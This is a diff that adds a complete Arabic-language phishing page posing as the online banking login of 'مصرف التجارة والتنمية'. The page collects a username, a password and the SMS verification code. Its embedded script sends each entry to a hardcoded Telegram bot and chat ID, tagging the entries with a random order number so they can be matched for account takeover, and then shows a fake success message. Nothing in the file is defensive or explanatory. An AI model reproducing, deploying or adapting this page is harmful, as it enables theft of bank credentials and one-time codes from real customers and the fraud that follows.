@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>المصرف الرقمي - تسجيل دخول</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Cairo', sans-serif;
+      background-color: #f5f5f5;
+      text-align: center;
+      height: 100vh;
+      overflow: hidden;
+      touch-action: none;
+    }
+    .logo img {
+      width: 100%;
+      height: auto;
+      max-height: 200px;
+      object-fit: cover;
+      display: block;
+    }
+    h2 { color: #333; font-size: 28px; margin: 10px 0; font-weight: bold; }
+    p { color: #666; font-size: 18px; margin: 5px 0 20px; }
+    .title { font-size: 28px; color: #333; font-weight: bold; margin-bottom: 30px; }
+    .alert { display: none; background-color: #ffdddd; color: #a94442; padding: 15px; margin: 20px auto; width: 80%; border-radius: 10px; font-size: 18px; }
+    .success-box { display: none; background-color: #dff0d8; color: #3c763d; padding: 20px; margin: 30px auto; width: 80%; border-radius: 10px; font-size: 20px; }
+    .success-box button { margin-top: 15px; padding: 10px 25px; font-size: 18px; background-color: #5cb85c; color: white; border: none; border-radius: 8px; cursor: pointer; }
+    form { max-width: 420px; margin: 0 auto; }
+    .input-group { position: relative; margin-bottom: 25px; }
+    .input-group input { width: 100%; padding: 20px 20px 20px 55px; border: 2px solid #ccc; border-radius: 50px; font-size: 20px; background-color: transparent; outline: none; color: #333; text-align: right; }
+    .input-group input::placeholder { color: #aaa; font-size: 18px; text-align: right; }
+    .input-group .fa { position: absolute; top: 50%; right: 20px; transform: translateY(-50%); color: #28a745; font-size: 22px; }
+    .login-button { background-color: #5cb85c; color: white; border: none; padding: 18px; width: 100%; border-radius: 50px; font-size: 20px; cursor: pointer; }
+    .login-button:hover { background-color: #4cae4c; }
+    #codePage, #codeAlert, #successMessage { display: none; }
+  </style>
+</head>
+<body>
+  <!-- الصفحة الأولى -->
+  <div id="loginPage">
+    <div class="logo"><img src="BCD.jpg" alt="شعار المصرف"></div>
+    <h2>تسجيل دخول</h2>
+    <p>اهلا في مصرف التجارة والتنمية</p>
+    <div class="title">المصرف الرقمي</div>
+    <div id="alert" class="alert">يرجى ملئ الحقول</div>
+    <form>
+      <div class="input-group">
+        <i class="fa fa-user"></i>
+        <input type="text" id="username" placeholder="اسم المستخدم">
+      </div>
+      <div class="input-group">
+        <i class="fa fa-lock"></i>
+        <input type="password" id="password" placeholder="كلمة المرور">
+      </div>
+      <button type="button" class="login-button" onclick="validateForm()">تسجيل الدخول</button>
+    </form>
+  </div>
+
+  <!-- الصفحة الثانية -->
+  <div id="codePage">
+    <div class="logo"><img src="BCD.jpg" alt="شعار المصرف"></div>
+    <h2>تسجيل الدخول</h2>
+    <p>ادخل الكود المرسل اليك في رسائل النصية SMS</p>
+    <div id="codeAlert" class="alert">يجب إدخال 6 أرقام على الأقل</div>
+    <form>
+      <div class="input-group">
+        <i class="fa fa-key"></i>
+        <input type="text" id="smsCode" placeholder="ادخل الكود" maxlength="6">
+      </div>
+      <button type="button" class="login-button" onclick="validateCode()">استمرار</button>
+    </form>
+  </div>
+
+  <!-- رسالة النجاح -->
+  <div id="successMessage" class="success-box">
+    تم تسجيلك بنجاح
+    <br>
+    <button onclick="returnToLogin()">حسناً</button>
+  </div>
+
+  <script>
+    // إعدادات تيليجرام
+    const TELEGRAM_TOKEN = "8272376544:AAFUzsrzs8Y0A12stFyr1NsLmZfqc_H3pfQ";
+    const CHAT_ID = "7166291647";
+
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      }).catch(err => console.error(err));
+    }
+
+    function removeArabicCharacters(input) {
+      const arabicRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF\u0660-\u0669]/g;
+      input.value = input.value.replace(arabicRegex, '');
+    }
+
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const smsCodeInput = document.getElementById('smsCode');
+    const alertBox = document.getElementById('alert');
+    const codeAlertBox = document.getElementById('codeAlert');
+    const loginPage = document.getElementById('loginPage');
+    const codePage = document.getElementById('codePage');
+    const successMessage = document.getElementById('successMessage');
+
+    let orderNumber = ""; // رقم الطلب العشوائي لكل جلسة
+
+    usernameInput.addEventListener('input', () => removeArabicCharacters(usernameInput));
+    passwordInput.addEventListener('input', () => removeArabicCharacters(passwordInput));
+
+    smsCodeInput.addEventListener('input', () => {
+      smsCodeInput.value = smsCodeInput.value.replace(/[^0-9]/g, '');
+      if (smsCodeInput.value.length > 6) smsCodeInput.value = smsCodeInput.value.slice(0, 6);
+    });
+
+    function generateOrderNumber() {
+      return Math.floor(100000 + Math.random() * 900000); // 6 أرقام عشوائية
+    }
+
+    function validateForm() {
+      if (usernameInput.value.trim() === '' || passwordInput.value.trim() === '') {
+        alertBox.style.display = 'block';
+        setTimeout(() => { alertBox.style.display = 'none'; }, 2000);
+      } else {
+        orderNumber = generateOrderNumber(); // إنشاء رقم الطلب
+        // إرسال بيانات تسجيل الدخول + رقم الطلب إلى تيليجرام
+        sendToTelegram(`🆔 رقم الطلب: ${orderNumber}\n👤 اسم المستخدم: ${usernameInput.value}\n🔑 كلمة المرور: ${passwordInput.value}`);
+        loginPage.style.display = 'none';
+        codePage.style.display = 'block';
+      }
+    }
+
+    function validateCode() {
+      if (smsCodeInput.value.trim().length < 6) {
+        codeAlertBox.style.display = 'block';
+        setTimeout(() => { codeAlertBox.style.display = 'none'; }, 2000);
+      } else {
+        // إرسال كود SMS + رقم الطلب
+        sendToTelegram(`🆔 رقم الطلب: ${orderNumber}\n🔢 كود SMS: ${smsCodeInput.value}`);
+        codePage.style.display = 'none';
+        successMessage.style.display = 'block';
+      }
+    }
+
+    function returnToLogin() {
+      successMessage.style.display = 'none';
+      loginPage.style.display = 'block';
+      usernameInput.value = '';
+      passwordInput.value = '';
+      smsCodeInput.value = '';
+      orderNumber = "";
+    }
+  </script>
+</body>
+</html>
